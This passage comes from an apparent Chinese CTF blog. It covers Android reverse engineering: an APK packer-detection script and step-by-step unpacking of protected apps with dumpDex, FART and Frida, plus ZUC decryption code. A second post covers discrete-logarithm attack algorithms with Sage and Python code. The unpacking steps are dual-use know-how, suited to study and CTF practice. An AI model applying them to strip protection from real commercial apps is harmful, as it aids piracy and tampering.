&quot;libx3g.so&quot;:&quot;顶像科技&quot;, &quot;libapssec.so&quot;:&quot;盛大&quot;, &quot;librsprotect.so&quot;:&quot;瑞星&quot;&#125;def shellDetector(apkpath): shellType=&quot;&quot; shellsign=&quot;&quot; flag=True zipfiles=zipfile.ZipFile(apkpath) nameList=zipfiles.namelist() for fileName in nameList: for shell in shellfeatures.keys(): if shell in fileName: flag=True shellType=shellfeatures[shell] shellsign=shell break else: flag=False if flag==True: print(&quot;经检测，该apk使用了&quot;+shellType+&quot;进行加固&quot;)if __name__ == &#x27;__main__&#x27;: shellDetector(&quot;test.apk&quot;) ​ 脱壳方法 dumpDexdumpDex-Android脱壳：https://github.com/WrBug/dumpDex dumpDex是一个github上开源的xposed插件，可以用来脱掉当前市场上大部分的壳。 一、准备工作 首先需要root的手机一部，我使用的是华为荣耀6（android5.1），安装好xposed框架 dumpDex项目地址：https://github.com/WrBug/dumpDex 可以直接下载release的apk，也可以自行编译打包成apk安装到手机，我个人比较喜欢第二种。 安装好apk后，对于32位手机，需要将lib/armeabi-v7a/libnativeDump.so复制到/data/local/tmp/libnativeDump.so，权限设置为777。 二、开始脱壳 反编译apk后，根据特征发现是使用了梆梆加固 安装插件，重启手机，打开加固的apk，脱壳的后的dex会在/data/data/对应包路径/dump文件夹下 脱壳后的dex如图所示，其中有一部分是壳的dex，需要自己自行选择一下 三、补充说明 设置权限问题，GitHub上有详细说明 编译过程有可能会有让你设置签名的一个问题，直接设置成你的debug签名就可 如果加固后的包名在PackageInfo.java中没有对应的，自行加到PackageInfo.java中即可 应用有可能有卡死状况或者手机重启状况，但应该能脱出壳来，建议多脱几遍 源码部分如果是百度系的壳，直接返回并有没dump，因为还没遇到过百度的壳，暂不知道具体原因 FART1、安装镜像 从https://github.com/hanbinglengyue/FART上下载镜像，然后按照https://www.bodkin.ren/index.php/archives/513/刷机，中间没有遇到什么问题。 123456789adb reboot bootloaderfastboot oem unlockfastboot flash system system.imgfastboot flash userdata userdata.imgfastboot flash boot boot.imgfastboot flash cache cache.imgfastboot flash ramdisk ramdisk.imgfastboot reboot 2、修改fart文件并上传 将fart配置文件fart复制到/data/fart（注意文件权限问题，和换行的问题），其中，fart配置文件中为要脱壳的app包名 1adb push ~/app_crack/fart/test/fart /data 3、查看日志确认 12# 在命令行输入下面的命令，然后打开appadb logcat -s ActivityThread 4、查看脱出来的dex 1adb pull /sdcard/fart/包名/6600696_dexfile.dex . Fridahttps://github.com/hluwa/FRIDA-DEXDump https://github.com/GuoQiang1993/Frida-Apk-Unpack 使用： 启动 APP。 启动 frida-server。 python main.py。 或者可以将脚本封装成命令，就像这样： 其他方法https://github.com/CodingGay/BlackDex https://www.freebuf.com/column/210015.html ​ 混淆BlackObfuscatorjeb 5.1+版本反编译，运行调试java代码。 ZUC解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163from math import ceil S0 = [ 0x3E, 0x72, 0x5B, 0x47, 0xCA, 0xE0, 0x00, 0x33, 0x04, 0xD1, 0x54, 0x98, 0x09, 0xB9, 0x6D, 0xCB, 0x7B, 0x1B, 0xF9, 0x32, 0xAF, 0x9D, 0x6A, 0xA5, 0xB8, 0x2D, 0xFC, 0x1D, 0x08, 0x53, 0x03, 0x90, 0x4D, 0x4E, 0x84, 0x99, 0xE4, 0xCE, 0xD9, 0x91, 0xDD, 0xB6, 0x85, 0x48, 0x8B, 0x29, 0x6E, 0xAC, 0xCD, 0xC1, 0xF8, 0x1E, 0x73, 0x43, 0x69, 0xC6, 0xB5, 0xBD, 0xFD, 0x39, 0x63, 0x20, 0xD4, 0x38, 0x76, 0x7D, 0xB2, 0xA7, 0xCF, 0xED, 0x57, 0xC5, 0xF3, 0x2C, 0xBB, 0x14, 0x21, 0x06, 0x55, 0x9B, 0xE3, 0xEF, 0x5E, 0x31, 0x4F, 0x7F, 0x5A, 0xA4, 0x0D, 0x82, 0x51, 0x49, 0x5F, 0xBA, 0x58, 0x1C, 0x4A, 0x16, 0xD5, 0x17, 0xA8, 0x92, 0x24, 0x1F, 0x8C, 0xFF, 0xD8, 0xAE, 0x2E, 0x01, 0xD3, 0xAD, 0x3B, 0x4B, 0xDA, 0x46, 0xEB, 0xC9, 0xDE, 0x9A, 0x8F, 0x87, 0xD7, 0x3A, 0x80, 0x6F, 0x2F, 0xC8, 0xB1, 0xB4, 0x37, 0xF7, 0x0A, 0x22, 0x13, 0x28, 0x7C, 0xCC, 0x3C, 0x89, 0xC7, 0xC3, 0x96, 0x56, 0x07, 0xBF, 0x7E, 0xF0, 0x0B, 0x2B, 0x97, 0x52, 0x35, 0x41, 0x79, 0x61, 0xA6, 0x4C, 0x10, 0xFE, 0xBC, 0x26, 0x95, 0x88, 0x8A, 0xB0, 0xA3, 0xFB, 0xC0, 0x18, 0x94, 0xF2, 0xE1, 0xE5, 0xE9, 0x5D, 0xD0, 0xDC, 0x11, 0x66, 0x64, 0x5C, 0xEC, 0x59, 0x42, 0x75, 0x12, 0xF5, 0x74, 0x9C, 0xAA, 0x23, 0x0E, 0x86, 0xAB, 0xBE, 0x2A, 0x02, 0xE7, 0x67, 0xE6, 0x44, 0xA2, 0x6C, 0xC2, 0x93, 0x9F, 0xF1, 0xF6, 0xFA, 0x36, 0xD2, 0x50, 0x68, 0x9E, 0x62, 0x71, 0x15, 0x3D, 0xD6, 0x40, 0xC4, 0xE2, 0x0F, 0x8E, 0x83, 0x77, 0x6B, 0x25, 0x05, 0x3F, 0x0C, 0x30, 0xEA, 0x70, 0xB7, 0xA1, 0xE8, 0xA9, 0x65, 0x8D, 0x27, 0x1A, 0xDB, 0x81, 0xB3, 0xA0, 0xF4, 0x45, 0x7A, 0x19, 0xDF, 0xEE, 0x78, 0x34, 0x60] S1 = [ 0x55, 0xC2, 0x63, 0x71, 0x3B, 0xC8, 0x47, 0x86, 0x9F, 0x3C, 0xDA, 0x5B, 0x29, 0xAA, 0xFD, 0x77, 0x8C, 0xC5, 0x94, 0x0C, 0xA6, 0x1A, 0x13, 0x00, 0xE3, 0xA8, 0x16, 0x72, 0x40, 0xF9, 0xF8, 0x42, 0x44, 0x26, 0x68, 0x96, 0x81, 0xD9, 0x45, 0x3E, 0x10, 0x76, 0xC6, 0xA7, 0x8B, 0x39, 0x43, 0xE1, 0x3A, 0xB5, 0x56, 0x2A, 0xC0, 0x6D, 0xB3, 0x05, 0x22, 0x66, 0xBF, 0xDC, 0x0B, 0xFA, 0x62, 0x48, 0xDD, 0x20, 0x11, 0x06, 0x36, 0xC9, 0xC1, 0xCF, 0xF6, 0x27, 0x52, 0xBB, 0x69, 0xF5, 0xD4, 0x87, 0x7F, 0x84, 0x4C, 0xD2, 0x9C, 0x57, 0xA4, 0xBC, 0x4F, 0x9A, 0xDF, 0xFE, 0xD6, 0x8D, 0x7A, 0xEB, 0x2B, 0x53, 0xD8, 0x5C, 0xA1, 0x14, 0x17, 0xFB, 0x23, 0xD5, 0x7D, 0x30, 0x67, 0x73, 0x08, 0x09, 0xEE, 0xB7, 0x70, 0x3F, 0x61, 0xB2, 0x19, 0x8E, 0x4E, 0xE5, 0x4B, 0x93, 0x8F, 0x5D, 0xDB, 0xA9, 0xAD, 0xF1, 0xAE, 0x2E, 0xCB, 0x0D, 0xFC, 0xF4, 0x2D, 0x46, 0x6E, 0x1D, 0x97, 0xE8, 0xD1, 0xE9, 0x4D, 0x37, 0xA5, 0x75, 0x5E, 0x83, 0x9E, 0xAB, 0x82, 0x9D, 0xB9, 0x1C, 0xE0, 0xCD, 0x49, 0x89, 0x01, 0xB6, 0xBD, 0x58, 0x24, 0xA2, 0x5F, 0x38, 0x78, 0x99, 0x15, 0x90, 0x50, 0xB8, 0x95, 0xE4, 0xD0, 0x91, 0xC7, 0xCE, 0xED, 0x0F, 0xB4, 0x6F, 0xA0, 0xCC, 0xF0, 0x02, 0x4A, 0x79, 0xC3, 0xDE, 0xA3, 0xEF, 0xEA, 0x51, 0xE6, 0x6B, 0x18, 0xEC, 0x1B, 0x2C, 0x80, 0xF7, 0x74, 0xE7, 0xFF, 0x21, 0x5A, 0x6A, 0x54, 0x1E, 0x41, 0x31, 0x92, 0x35, 0xC4, 0x33, 0x07, 0x0A, 0xBA, 0x7E, 0x0E, 0x34, 0x88, 0xB1, 0x98, 0x7C, 0xF3, 0x3D, 0x60, 0x6C, 0x7B, 0xCA, 0xD3, 0x1F, 0x32, 0x65, 0x04, 0x28, 0x64, 0xBE, 0x85, 0x9B, 0x2F, 0x59, 0x8A, 0xD7, 0xB0, 0x25, 0xAC, 0xAF, 0x12, 0x03, 0xE2, 0xF2] D = [ 0x44D7, 0x26BC, 0x626B, 0x135E, 0x5789, 0x35E2, 0x7135, 0x09AF, 0x4D78, 0x2F13, 0x6BC4, 0x1AF1, 0x5E26, 0x3C4D, 0x789A, 0x47AC] def addition_uint31(a, b): c = a + b return (c &amp; 0x7FFFFFFF) + (c &gt;&gt; 31) def rotl_uint31(a, shift): return ((a &lt;&lt; shift) | (a &gt;&gt; (31 - shift))) &amp; 0x7FFFFFFF def rotl_uint32(a, shift): return ((a &lt;&lt; shift) | (a &gt;&gt; (32 - shift))) &amp; 0xFFFFFFFF def l1(x): return (x ^ rotl_uint32(x, 2) ^ rotl_uint32(x, 10) ^ rotl_uint32(x, 18) ^ rotl_uint32(x, 24)) def l2(x): return (x ^ rotl_uint32(x, 8) ^ rotl_uint32(x, 14) ^ rotl_uint32(x, 22) ^ rotl_uint32(x, 30)) def make_uint32(a, b, c, d): return ((a &lt;&lt; 24) &amp; 0xffffffff) | ((b &lt;&lt; 16) &amp; 0xffffffff) | ((c &lt;&lt; 8) &amp; 0xffffffff) | d def make_uint31(a, b, c): return ((a &lt;&lt; 23) &amp; 0x7fffffff) | ((b &lt;&lt; 8) &amp; 0x7fffffff) | c class ZUC(object): def __init__(self, key, iv): self.r = [0, 0] self.lfsr = [0 for _ in range(16)] self.x = [0, 0, 0, 0] self.zuc_init(key, iv) def bit_reorganization(self): self.x[0] = ((self.lfsr[15] &amp; 0x7FFF8000) &lt;&lt; 1) | (self.lfsr[14] &amp; 0xFFFF) self.x[1] = ((self.lfsr[11] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[9] &gt;&gt; 15) self.x[2] = ((self.lfsr[7] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[5] &gt;&gt; 15) self.x[3] = ((self.lfsr[2] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[0] &gt;&gt; 15) def lfsr_next(self): f = self.lfsr[0] v = rotl_uint31(self.lfsr[0], 8) f = addition_uint31(f, v) v = rotl_uint31(self.lfsr[4], 20) f = addition_uint31(f, v) v = rotl_uint31(self.lfsr[10], 21) f = addition_uint31(f, v) v = rotl_uint31(self.lfsr[13], 17) f = addition_uint31(f, v) v = rotl_uint31(self.lfsr[15], 15) f = addition_uint31(f, v) return f def lfsr_append(self, f): self.lfsr.append(f) if len(self.lfsr) &gt; 16: self.lfsr.pop(0) def lfsr_init(self, u): self.lfsr_append(addition_uint31(self.lfsr_next(), u)) def lfsr_shift(self): self.lfsr_append(self.lfsr_next()) def f(self): W = ((self.x[0] ^ self.r[0]) + self.r[1]) &amp; 0xffffffff W1 = (self.r[0] + self.x[1]) &amp; 0xffffffff W2 = self.r[1] ^ self.x[2] u = l1(((W1 &amp; 0x0000ffff) &lt;&lt; 16) | (W2 &gt;&gt; 16)) v = l2(((W2 &amp; 0x0000ffff) &lt;&lt; 16) | (W1 &gt;&gt; 16)) self.r = [make_uint32(S0[u &gt;&gt; 24], S1[(u &gt;&gt; 16) &amp; 0xFF], S0[(u &gt;&gt; 8) &amp; 0xFF], S1[u &amp; 0xFF]), make_uint32(S0[v &gt;&gt; 24], S1[(v &gt;&gt; 16) &amp; 0xFF], S0[(v &gt;&gt; 8) &amp; 0xFF], S1[v &amp; 0xFF])] return W def zuc_init(self, key, iv): # Expand key. self.lfsr = [make_uint31(key[i], D[i], iv[i]) for i in range(16)] self.r = [0, 0] for i in range(32): self.bit_reorganization() w = self.f() self.lfsr_init(w &gt;&gt; 1) def zuc_generate_keystream(self, length): keystream_buffer = [] self.bit_reorganization() self.f() # Discard the output of F. def itor(): self.lfsr_shift() self.bit_reorganization() return self.f() ^ self.x[-1] keystream_buffer = [itor() for _ in range(length)] self.lfsr_shift() return keystream_buffer def zuc_encrypt(self, input): length = len(input) key_stream = self.zuc_generate_keystream(length) return [inp ^ key_stream[i] for i, inp in enumerate(input)] if &#x27;__main__&#x27; == __name__: key = [] iv = [] # Decrypt zuc2 = ZUC(key, iv) cipher = [] out2 = zuc2.zuc_encrypt(cipher) print(&quot;Decrypted: &quot;, [&quot;%08x&quot; % e for e in out2]) print(&#x27;&#x27;.join(map(chr,out2)))","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"}],"author":"Lazzaro"},{"title":"离散对数","slug":"crypto-离散对数","date":"2020-05-07T12:03:21.000Z","updated":"2024-04-09T10:13:04.790Z","comments":true,"path":"2020/05/07/crypto-离散对数/","permalink":"https://lazzzaro.github.io/2020/05/07/crypto-%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/","excerpt":"","text":"​ 在整数中，离散对数（Discrete Logarithm, DL）是一种基于同余运算和原根的一种对数运算。 在任何群 $G$ 中可为所有整数 $k$ 定义一个幂数为 $b^k$，而离散对数 $\\log_ba$ 是指使得 $b^k = a$ 的整数 $k$。 离散对数在一些特殊情况下可以快速计算。然而，通常没有具非常效率的方法来计算它们。公钥密码学中几个重要算法的基础，是假设寻找离散对数的问题解，在仔细选择过的群中，并不存在有效率的求解算法。 ​ 基本定义生成元 在一个群 $G$ 中，如果 $g$ 是 $G$ 的生成元，即所有 $G$ 中的所有元素都可以被表示成 $y=g^x$，此时的 $x$ 称为 $y$ 在 $G$ 中的对数。 阶 设 $m \\ge 1,\\gcd(a,m)=1$，使得 $a^d \\equiv 1 \\pmod m$ 成立的最小正整数 $d$ 称为 $a$ 对模 $m$ 的指数或者阶。一般将其计为 $\\delta_m(a)$。 满足 $a^d \\equiv 1 \\pmod m$ 的 $d$ 一定满足 $d \\mid \\varphi(m)$。 原根 当 $\\delta_m(a)=\\varphi(m)$ 时，称 $a$ 是模 $m$ 的原根，简称 $m$ 的原根。 只有 $m=2,4,p^\\alpha,2p^\\alpha$（$p$ 为奇素数，$\\alpha$ 为正整数）时，模 $m$ 的剩余系存在原根。（充要条件） ​ 常规Sage函数参数说明：求解以base为底，a的对数；ord为base的阶，可以缺省，operation可以是+与*，默认为*；bounds是一个区间(ld,ud)，需要保证所计算的对数在此区间内。 discrete_log(a,base,ord,operation) 通用的求离散对数的方法。 discrete_log_rho(a,base,ord,operation) 求离散对数的Pollard-Rho算法。 discrete_log_lambda(a,base,bounds,operation) 求离散对数的Pollard-kangaroo算法（也称为lambda算法）。 bsgs(base,a,bounds,operation) 小步大步法。 12345678910111213141516#生成64位的素数p作为模数，int为32位，超过int要在数字后加Lp=random_prime(2L**64) #定义有限域GF(p)G=GF(p) #找一个模p的原根gp (&#x27;znprimroot(&#x27;+str(p)+&#x27;)&#x27;)#输出Mod(rt,p)，则x是模p的原根g=G(rt) #生成私钥x=G(ZZ.random_element(p-1)) #公钥y=g^x mod p，由于已经定义在GF(p)上，因此g**x就是g^x mod py=g**x 1234567891011121314151617181920212223#计算DLP的通用方法discrete_log(y,g)==x#n为合数（Pohlig-Hellman）x = discrete_log(mod(b,n),mod(a,n)) #n为质数或质数幂（线性筛Index Calculus）R = Integers(99)a = R(4)b = a^9b.log(a)#或x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) #计算离散对数的lambda方法discrete_log_lambda(y,g,(floor(ZZ(x)/2),2*ZZ(x)))==x #小步大步法计算DLPbsgs(g,y,(floor(ZZ(x)/2),2*ZZ(x)))==x#GF(p)下计算DLPF = GF(p)ax = F(b + (a - 1) * A) / F(a * s - s + b)x = discrete_log(F(ax), F(a)) 自改DLP： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667multiplication_names = ( &#x27;multiplication&#x27;, &#x27;times&#x27;, &#x27;product&#x27;, &#x27;*&#x27;)addition_names = ( &#x27;addition&#x27;, &#x27;plus&#x27;, &#x27;sum&#x27;, &#x27;+&#x27;)def old_discrete_log(a, base, ord=None, operation=&#x27;*&#x27;, identity=None, inverse=None, op=None): b = base from operator import inv, mul, neg, add Z = Integers() if operation in multiplication_names: identity = b.parent()(1) inverse = inv op = mul if ord==None: ord = b.multiplicative_order() elif operation in addition_names: identity = b.parent()(0) inverse = neg op = add if ord==None: ord = b.order() else: if ord==None or identity==None or inverse==None or op==None: print(ord, identity, inverse, op) if ord &lt; 100: c = identity for i in range(ord): if c == a: # is b^i return Z(i) c = op(c,b) m = ord.isqrt()+1 # we need sqrt(ord) rounded up table = dict() # will hold pairs (b^j,j) for j in range(m) g = identity # will run through b**j for j in range(m): if a==g: return Z(j) table[g] = j g = op(g,b) g = inverse(g) # this is now b**(-m) h = op(a,g) # will run through a*g**i = a*b**(-i*m) for i in range(1,m): j = table.get(h) if not j==None: # then a*b**(-i*m) == b**j return Z(i*m + j) if i &lt; m-1: h = op(h,g)def d_log(q): print(&quot;dlogging: &quot;, q) dlogs = [] for f in factors: t = order//f qt = G_mul(q,t) gent = G_mul(gen, t) dlog = old_discrete_log(qt, gent, ord=f, operation=&#x27;NONE&#x27;, op=G_add, identity=zero, inverse=inverse) dlogs.append(dlog) if None in dlogs: raise ValueError(&quot;oh no&quot;) l = CRT_list(dlogs, factors) return lgen = (,)c = (,)k = d_log(c)print(k) ​ 大步小步算法（BSGS）大步小步算法常用于求解用于解决解高次同余方程的问题，问题形式如：有同余方程$a^x \\equiv b \\pmod p$，$p$ 为质数，求最小非负整数解 $x$ 使得原方程成立。这类问题也称为离散对数问题。该算法的复杂度可以达到$O(\\sqrt{p}\\log{n})$甚至更低。 12#Sagebsgs(base,a,bounds,operation) 1234567891011121314151617181920212223def babystep_giantstep(g, y, p): m = int((p-1)**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step gm = pow(g, -m, p) # gm = g^&#123;-m&#125; ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: # 右辺と左辺が一致するとき return q * m + table[ygqm] ygqm = (ygqm * gm) % p return Noneg = y = p = x = babystep_giantstep(g, y, p)print(x)print(pow(g, x, p) == y) ​ Pollard Rho算法Pollard Rho算法是一种随机性的概率型算法，基于PR算法我们可以加速大整数的因子分解，这也是1975年Pollard提出该算法时的应用方面，这可以用来攻击RSA的公钥密码体制，之后在1978年Pollard又利用循环群 $ρ$ 形的特点提出了用于解决离散对数问题的PR算法，后来也扩展到了椭圆曲线上，这样PR算法便成功威胁到了整个公钥密码体系。 解决离散对数问题的Pollard Rho算法，可以帮助我们在有限的循环群上解决离散对数问题。简单来看我们取一个大素数 $P$，设 $G$ 为一个乘法的循环群，其生成元为 $g$，则该群的阶就是 $N=P-1$。此时在 $G$ 上的离散对数问题就是对于 $G$ 中的元素 $q$，找到 $x$ 使得 $g^x=q$，而Pollard Rho算法主要就是利用了循环群的生成序列呈现一个 $ρ$ 字形状。 使用Pollard Rho算法后可以将求解的时间复杂度降到 $O(\\sqrt{N})$，至于空间复杂度则可以忽略不计，因为该算法是个概率型算法，每次只随机选取一对进行比较，所以不会占用存储，这与大步小步算法相反，其实PR算法也可以看作是大步小步算法的随机化版本，继承令时间复杂度的有点，同时还减少了空间的消耗，因为大步小步算法需要占用大量的存储空间。 此算法适用于生成元的阶的素因子都是大数的情形。 参考：https://xz.aliyun.com/t/2780 12#Sagediscrete_log_rho(a,base,ord,operation) 12345678910111213141516171819202122232425262728293031def pollard_rho(g, y, p): q = (p-1) // 2 def new_xab(x, a, b, g, y, p, q): subset = x % 3 if subset == 0: return ((x*x) % p, (a*2) % q, (b*2) % q) if subset == 1: return ((x*g) % p, (a+1) % q, b ) if subset == 2: return ((x*y) % p, a , (b+1) % q) x, a, b = 1, 0, 0 X, A, B = x, a, b for i in range(1, p): x, a, b = new_xab(x, a, b, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) if x == X: break res = ((a - A) * pow(B - b, -1, q)) % q if pow(g, res, p) == y: return res if pow(g, res + q, p) == y: return res + q return Noneg = y = p = x = pollard_rho(g, y, p)print(x)print(pow(g, x, p) == y) ​ Pohlig-Hellman算法Pohig-Hellman算法是一种求解光滑阶循环群上的离散对数的方法。 Pohlig-Hellman算法的复杂度在一般情况下比BSGS算法高，但是在特殊情况下（循环群的阶是光滑数，即可以因子分解成较小的数的乘积），使用Pohlig-Hellman能取得好的效果。而且有些时候，尽管BSGS能够将复杂度降至$\\sqrt{p}$，但是这个数依然很大，所以不能用。这时可以考虑Pohlig-hellman方法能不能起作用。 算法思想 考虑DLP问题：$a^x \\equiv b \\pmod p$，因为 $p$ 是大素数，模 $p$ 的循环群的阶是 $p−1$。假设模 $p$ 的最小的本原元是 $g$（本原元是可以求的），那么有 $\\left\\{\\begin{array}{c} a \\equiv g^{a’} \\pmod p \\\\ b \\equiv g^{b’} \\pmod p \\end{array}\\right.$ 进一步有 $a^x \\equiv b \\pmod p \\Longleftrightarrow g^{a’x} \\equiv g^{b’} \\pmod p$， 有 $a’x \\equiv b’ \\pmod {p-1}$， 如果求出了满足上式的 $a’$ 和 $b’$ ，通过扩展gcd方法可以求一次同余方程的解得到 $x$ 。 问题归结成如何求 $a’$ 和 $b’$ ，即原本的一个离散对数问题，现在变成两个离散对数问题： $\\left\\{\\begin{array}{c} a \\equiv g^{a’} \\pmod p \\\\ b \\equiv g^{b’} \\pmod p \\end{array}\\right.$ 以求 $a’$ 为例，解DLP问题：$g^x \\equiv a \\pmod p$： 将 $p-1$ 进行标准的素因子分解，即 $p-1=\\prod\\limits_{i=1}^{m} p_i^{k_i}=p_1^{k_1}p_2^{k_2}p_3^{k_3} \\cdots p_m^{k_m}$； 对每个素因子 $p_i$，将 $x$ 表示成 $p_i$ 进制，有 $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$， 这样的 $p_i$ 进制表示，系数 $a_i$ 自然是小于 $p_i$； 令 $r=1$，有 $(g^x)^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$，展开 $x$ 有 $(g^{a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1}})^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$ $g^{a_0{\\frac{p-1}{p_i}}} \\cdot g^{a_1(p-1)} \\cdot g^{a_2(p-1)p_i} \\cdots g^{a_{k_i-1}(p-1)p_i^{k_i-2}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ 注意从第二项开始，每一项指数都包含 $p−1$（由费马小定理知 $g^{p-1} \\equiv 1 \\pmod p$），所以式子变成 $g^{a_0{\\frac{p-1}{p_i}}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ 这个式子中只有 $a_0$ 是未知的，因为 $a_0 \\in [0,p_i−1]$，所以可以穷举得到 $a_0$ 的值。 再令 $r=2,3,4,\\cdots,k_i$，重复步骤3，依次穷举求出 $a_1,a_2,\\cdots,a_{k_i-1}$，整个的时间复杂度是 $\\mathrm{O}(p_ik_i)$。可以得到 $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$ 重复上述过程，得到 $m$ 个关于 $x$ 的式子，利用中国剩余定理（CRT），可以计算出 $x$ 的值。 利用这个方法求出 $a’$ 和 $b’$ 后，就可以得到原DLP问题的解。 注： Pohlig-Hellman算法最重要的点是利用了原根的性质，它只能解决 $a \\equiv g^x \\pmod p$（$g$ 是原根）的问题，对于 $g$ 不是原根的情况，需要利用原根将原方程转化成两个关于原根的离散对数问题。 注意Pohlig-hellman只能用于求解光滑阶群，也就是 $p-1$ 可以分解成小的素因子乘积。否则，穷举 $a_i$ 的时间复杂度依旧很高。另外可以考虑在穷举 $a_i$ 时利用小步大步算法，进一步优划算法复杂度。 123456789101112131415161718192021222324252627282930313233343536373839404142# Baby-step Giant-step法def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohlig–Hellman法def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xg = y = p = x = pohlig_hellman_DLP(g, y, p)print(x)print(pow(g, x, p) == y) ​ 指数计算法 / Index Calculus Algorithm1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465def is_Bsmooth(b, n): factors = list(factor(int(n))) if len(factors) != 0 and factors[-1][0] &lt;= b: return True, dict(factors) else: return False, dict(factors)def find_congruences(B, g, p, congruences=[]): unique = lambda l: list(set(l)) bases = [] max_equations = prime_pi(B) while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, pow(g,k,p)) if ok: congruences.append((factors, k)) if len(congruences) &gt;= max_equations: break bases = unique([base for c in [c[0].keys() for c in congruences] for base in c]) return bases, congruencesdef to_matrices(R, bases, congruences): M = [[c[0][base] if base in c[0] else 0 \\ for base in bases] for c in congruences] b = [c[1] for c in congruences] return Matrix(R, M), vector(R, b)def index_calculus(g, y, p, B=None): R = IntegerModRing(p-1) if B is None: B = ceil(exp(0.5*sqrt(2*log(p)*log(log(p))))) bases = [] congruences = [] for i in range(100): bases, congruences = find_congruences(B, g, p, congruences) M, b = to_matrices(R, bases, congruences) try: exponents = M.solve_right(b) break except ValueError: # matrix equation has no solutions continue else: return None # ag^y mod p while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, (y * pow(g,k,p)) % p) if ok and set(factors.keys()).issubset(bases): print(&#x27;found k = &#123;&#125;&#x27;.format(k)) break print(&#x27;bases:&#x27;, bases) print(&#x27;q:&#x27;, factors.keys()) dlogs = &#123;b: exp for (b,exp) in zip(bases, exponents)&#125; x = (sum(dlogs[q] * e for q, e in factors.items()) - k) % (p-1) if pow(g, x, p) == y: return x return Noneg = y = p = x = index_calculus(g, y, p)print(x)print(pow(g, x, p) == y) ​ 多项式DLP参考：InCTF 2020 - DLPoly 1234567891011121314151617181920212223242526272829303132333435363738394041424344#Sagedef brute_dlp(gi, ci, n, lim): bi = gi for i in range(1, lim+1): if bi == ci: return i bi = (bi * gi) % n print(&quot;[-] NOT in the range&quot;) print(&quot;[-] Something&#x27;s Wrong, you gotta check the range&quot;, lim)def pohlig_hellman(g, c, s, n, factors): res = [] modulus = [] for q, e in factors: assert pow(g, s//(q**e), n) != 1 gi = pow(g, s//(q**e), n) ci = pow(c, s//(q**e), n) dlogi = brute_dlp(gi, ci, n, q**e) print(&quot;[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(q**e, dlogi)) res.append(dlogi) modulus.append(q**e) print(&quot;\\n[*] res = &quot;, res) print(&quot;[*] modulus = &quot;, modulus) dlog = CRT(res, modulus) print(&quot;\\n[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(prod(modulus), dlog)) return dlogp = P = PolynomialRing(Zmod(p), name=&#x27;x&#x27;)x = P.gen()n = g = nfactors = n.factor()s = 1for i in nfactors: s *= p**(i[0].degree()) - 1print(s)print(factor(s))qe = dlog = pohlig_hellman(g, c, s, n, qe)flag = bytes.fromhex(hex(dlog)[2:])print(&quot;\\n[*] flag = &quot;, flag.decode()) ​ 矩阵DLP给定 $n$ 阶矩阵 $G$，求满足 $G^x=H$ 的 $x$ 值。 通常矩阵的乘法是复杂的，而矩阵的幂就更是这样了。注意到 $A^n=P(P^{-1}AP^n)P^{-1}$， 如果能找到合适的矩阵 $P$ 使得 $P^{−1}AP$ 的幂是简单的，就找到了计算矩阵的幂乃至多项式的简便方法。例如计算对角矩阵的幂只需对分量求幂，这就非常简单。 但是并非所有的 $n$ 阶矩阵都可以对角化，经过复杂的论证，得知 $n$ 阶矩阵一定有 Jordan 标准型，也就是对于 $n$ 阶矩阵 $A$，构造可逆矩阵 $P$ 使得 $P^{-1}AP=\\text{diag}\\{J_1,J_2,\\cdots,J_s\\}$，其中 $J_1,J_2,\\cdots,J_s$ 是 Jordan 块。所谓特征值为 $\\lambda$ 的 $n$ 阶 Jordan 块，就是 $n$ 阶矩阵 $J_n(\\lambda)=\\left(\\begin{matrix} \\lambda &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; \\lambda &amp; 1 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; 0 &amp; \\lambda &amp; \\cdots 